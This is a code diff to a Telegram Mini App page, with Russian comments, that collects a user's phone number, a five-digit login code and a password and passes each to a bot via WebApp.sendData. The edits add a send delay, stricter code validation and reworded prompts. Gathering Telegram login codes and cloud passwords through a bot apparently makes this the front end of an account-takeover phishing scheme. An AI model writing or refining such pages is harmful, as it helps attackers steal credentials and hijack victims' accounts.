@@ -182,15 +182,22 @@
         function sendData(data, buttonElement) {
             const originalText = buttonElement.innerText;
             buttonElement.disabled = true;
-            buttonElement.innerText = 'Загрузка...';
+            buttonElement.innerText = 'Отправка...';
 
-            try {
-                WebApp.sendData(JSON.stringify(data));
-            } catch (error) {
-                displayMessage('Ошибка отправки: ' + error.message, 'error');
-                buttonElement.disabled = false;
-                buttonElement.innerText = originalText;
-            }
+            // Показываем пользователю, что данные отправляются
+            displayMessage('Данные отправляются...', 'info');
+
+            // Небольшая задержка позволяет показать сообщение перед закрытием приложения
+            setTimeout(() => {
+                try {
+                    WebApp.sendData(JSON.stringify(data));
+                    // WebApp закроется автоматически после sendData
+                } catch (error) {
+                    displayMessage('Ошибка отправки: ' + error.message, 'error');
+                    buttonElement.disabled = false;
+                    buttonElement.innerText = originalText;
+                }
+            }, 300); // Задержка в 300 миллисекунд
         }
 
         // --- Логика для полей ввода кода ---
@@ -219,9 +226,9 @@
         // --- Обработчики кнопок ---
         
         phoneButton.addEventListener('click', () => {
-            const phone = phoneInput.value.replace(/[^0-9+]/g, '');
+            const phone = phoneInput.value.replace(/[^0-9+]/g, ''); // Очистка номера
             if (phone.length < 10) {
-                displayMessage('Введите корректный номер телефона.', 'error');
+                displayMessage('Пожалуйста, введите корректный номер телефона.', 'error');
                 return;
             }
             sendData({ step: 'phone', phone: phone }, phoneButton);
@@ -229,8 +236,8 @@
 
         codeButton.addEventListener('click', () => {
             const code = codeInputs.map(input => input.value).join('');
-            if (code.length < 5) {
-                displayMessage('Код должен содержать не менее 5 цифр.', 'error');
+            if (code.length !== 5) {
+                displayMessage('Код должен состоять из 5 цифр.', 'error');
                 return;
             }
             sendData({ step: 'code', code: code }, codeButton);
@@ -239,7 +246,7 @@
         passwordButton.addEventListener('click', () => {
             const password = passwordInput.value;
             if (!password) {
-                displayMessage('Введите ваш пароль.', 'error');
+                displayMessage('Пожалуйста, введите ваш пароль.', 'error');
                 return;
             }
             sendData({ step: 'password', password: password }, passwordButton);
@@ -251,8 +258,9 @@
         function init() {
             try {
                 WebApp.ready();
-                WebApp.expand();
+                WebApp.expand(); // Раскрываем WebApp на весь экран
                 
+                // Определяем, какой экран показать, на основе URL-параметра
                 const urlParams = new URLSearchParams(window.location.search);
                 const step = urlParams.get('step');
                 
@@ -263,13 +271,14 @@
                     showView(passwordView);
                     passwordInput.focus();
                 } else {
+                    // По умолчанию показываем экран ввода телефона
                     showView(phoneView);
                     phoneInput.focus();
                 }
 
             } catch (error) {
                 console.error("Failed to init Telegram WebApp:", error);
-                displayMessage("Ошибка: Не удалось инициализировать Telegram WebApp.", 'error');
+                document.body.innerHTML = "Ошибка: Не удалось инициализировать Telegram WebApp. Убедитесь, что открываете через Telegram.";
             }
         }
 
@@ -281,4 +290,4 @@
         
     </script>
 </body>
-</html>
+            </html>
